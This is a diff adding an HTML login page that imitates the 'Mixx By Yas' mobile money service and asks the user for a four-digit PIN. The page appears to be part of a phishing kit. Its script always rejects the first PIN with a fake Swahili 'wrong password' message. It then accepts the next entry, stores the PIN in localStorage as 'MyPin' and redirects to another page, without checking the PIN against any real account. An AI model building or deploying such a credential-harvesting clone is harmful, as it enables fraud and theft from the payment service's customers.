@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mixx Login</title>
+    <style>
+        :root {
+            --mixx-blue: #003366;
+            --mixx-accent: #005596;
+            --btn-disabled: #dce4ed;
+            --btn-text-disabled: #94a3b1;
+            --error-red: #d93025;
+            --border-color: #cbd5e1;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #ffffff;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10vh 24px 0 24px;
+            overflow: hidden;
+        }
+
+        /* Logo Styling */
+        .brand-container {
+            margin-bottom: 70px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo-text {
+            font-size: 72px;
+            font-weight: 900;
+            color: var(--mixx-accent);
+            font-style: italic;
+            letter-spacing: -4px;
+            line-height: 0.8;
+        }
+
+        .by-yas {
+            align-self: flex-end;
+            margin-top: -10px;
+            margin-right: -20px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .by-text {
+            font-size: 16px;
+            font-weight: bold;
+            color: var(--mixx-blue);
+            font-style: italic;
+        }
+
+        .yas-tag {
+            background-color: var(--mixx-blue);
+            color: #ffcc00;
+            font-weight: 900;
+            padding: 4px 10px;
+            border-radius: 50% 50% 50% 10%;
+            font-size: 14px;
+        }
+
+        /* User & Instructions */
+        .welcome-section {
+            text-align: center;
+            color: var(--mixx-blue);
+            margin-bottom: 45px;
+        }
+
+        .welcome-msg { font-size: 21px; margin-bottom: 4px; }
+        .phone-display { font-size: 19px; font-weight: 700; height: 24px; }
+
+        .pin-label {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--mixx-blue);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        /* PIN Inputs */
+        .pin-group {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 8px;
+        }
+
+        .pin-box {
+            width: 62px;
+            height: 62px;
+            border: 1.5px solid var(--border-color);
+            border-radius: 12px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--mixx-blue);
+            outline: none;
+            background: white;
+            transition: border-color 0.2s;
+        }
+
+        .pin-box:focus { border-color: var(--mixx-accent); }
+
+        .error-msg {
+            color: var(--error-red);
+            font-size: 14px;
+            font-weight: 600;
+            height: 20px;
+            margin-bottom: 25px;
+            text-align: center;
+            visibility: hidden;
+        }
+
+        /* Login Button */
+        .login-btn {
+            width: 100%;
+            max-width: 350px;
+            height: 58px;
+            border-radius: 30px;
+            border: none;
+            background-color: var(--btn-disabled);
+            color: var(--btn-text-disabled);
+            font-size: 18px;
+            font-weight: 600;
+            cursor: not-allowed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: all 0.2s ease;
+        }
+
+        .login-btn.active {
+            background-color: var(--mixx-accent);
+            color: white;
+            cursor: pointer;
+        }
+
+        .forgot-link {
+            align-self: flex-end;
+            margin-top: 15px;
+            color: var(--mixx-blue);
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 15px;
+            width: 100%;
+            max-width: 350px;
+            text-align: right;
+        }
+
+        /* Footer Utilities */
+        .divider-box {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            max-width: 350px;
+            margin: 40px 0;
+        }
+
+        .divider-line { flex: 1; height: 1px; background-color: #eee; }
+        .divider-text { padding: 0 12px; color: var(--mixx-blue); font-size: 14px; }
+
+        .footer-actions {
+            display: flex;
+            align-items: center;
+            gap: 60px;
+        }
+
+        .bio-circle {
+            width: 70px;
+            height: 70px;
+            background-color: var(--mixx-blue);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        .toggle-track {
+            width: 52px;
+            height: 28px;
+            background: #e2e8f0;
+            border-radius: 14px;
+            position: relative;
+            border: 1px solid #cbd5e1;
+        }
+
+        .toggle-thumb {
+            width: 22px;
+            height: 22px;
+            background: var(--mixx-blue);
+            border-radius: 50%;
+            position: absolute;
+            right: 3px;
+            top: 2px;
+        }
+
+        /* Spinner */
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="brand-container">
+        <div class="logo-text">Mixx</div>
+        <div class="by-yas">
+            <span class="by-text">By</span>
+            <div class="yas-tag">yas</div>
+        </div>
+    </div>
+
+    <div class="welcome-section">
+        <div class="welcome-msg">Welcome back!</div>
+        <div class="phone-display" id="numDisplay"></div>
+    </div>
+
+    <div class="content-body" style="width: 100%; max-width: 350px; display: flex; flex-direction: column; align-items: center;">
+        <label class="pin-label">Enter your Mixx PIN</label>
+        
+        <div class="pin-group">
+            <input type="number" class="pin-box" maxlength="1" inputmode="numeric">
+            <input type="number" class="pin-box" maxlength="1" inputmode="numeric">
+            <input type="number" class="pin-box" maxlength="1" inputmode="numeric">
+            <input type="number" class="pin-box" maxlength="1" inputmode="numeric">
+        </div>
+
+        <div class="error-msg" id="error">Password Sio Sahihi</div>
+
+        <button class="login-btn" id="loginBtn" disabled>Login</button>
+        <a href="#" class="forgot-link">Forgot PIN?</a>
+
+        <div class="divider-box">
+            <div class="divider-line"></div>
+            <div class="divider-text">Or login with</div>
+            <div class="divider-line"></div>
+        </div>
+
+        <div class="footer-actions">
+            <div class="bio-circle">
+                <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.5">
+                    <path d="M12 11v2M12 7v1M12 16v1M15.5 8.5c0-1.933-1.567-3.5-3.5-3.5S8.5 6.567 8.5 8.5V15.5c0 1.933 1.567 3.5 3.5 3.5s3.5-1.567 3.5-3.5V12" stroke-linecap="round"/>
+                    <rect x="5" y="3" width="14" height="18" rx="7" />
+                </svg>
+            </div>
+            <div class="toggle-track">
+                <div class="toggle-thumb"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const inputs = document.querySelectorAll('.pin-box');
+        const loginBtn = document.getElementById('loginBtn');
+        const errorMsg = document.getElementById('error');
+        const numDisplay = document.getElementById('numDisplay');
+
+        // Number Retrieval Logic
+        const storedNumberData = localStorage.getItem('My number');
+        if (storedNumberData) {
+            try {
+                const parsed = JSON.parse(storedNumberData);
+                numDisplay.textContent = parsed.number || "";
+            } catch {
+                numDisplay.textContent = storedNumberData;
+            }
+        }
+
+        // PIN Input Flow
+        inputs.forEach((input, idx) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
+                if (e.target.value && idx < 3) inputs[idx + 1].focus();
+                toggleBtn();
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && idx > 0) inputs[idx - 1].focus();
+            });
+        });
+
+        function toggleBtn() {
+            const filled = Array.from(inputs).every(i => i.value !== "");
+            loginBtn.classList.toggle('active', filled);
+            loginBtn.disabled = !filled;
+        }
+
+        function clearInputs() {
+            inputs.forEach(i => i.value = "");
+            toggleBtn();
+            inputs[0].focus();
+        }
+
+        // Login Logic
+        loginBtn.addEventListener('click', () => {
+            const pinVal = Array.from(inputs).map(i => i.value).join('');
+            const isFirstAttempt = !localStorage.getItem('mixx_init_attempt');
+
+            const originalContent = loginBtn.innerHTML;
+            loginBtn.innerHTML = '<div class="spinner"></div>';
+            loginBtn.disabled = true;
+
+            setTimeout(() => {
+                if (isFirstAttempt) {
+                    // Fail logic
+                    errorMsg.style.visibility = 'visible';
+                    localStorage.setItem('mixx_init_attempt', 'true');
+                    clearInputs();
+                    loginBtn.innerHTML = originalContent;
+                    
+                    setTimeout(() => {
+                        errorMsg.style.visibility = 'hidden';
+                    }, 2000);
+                } else {
+                    // Success logic
+                    localStorage.setItem('MyPin', pinVal);
+                    window.location.href = 'index4.html';
+                }
+            }, 2000);
+        });
+    </script>
+</body>
+              </html>
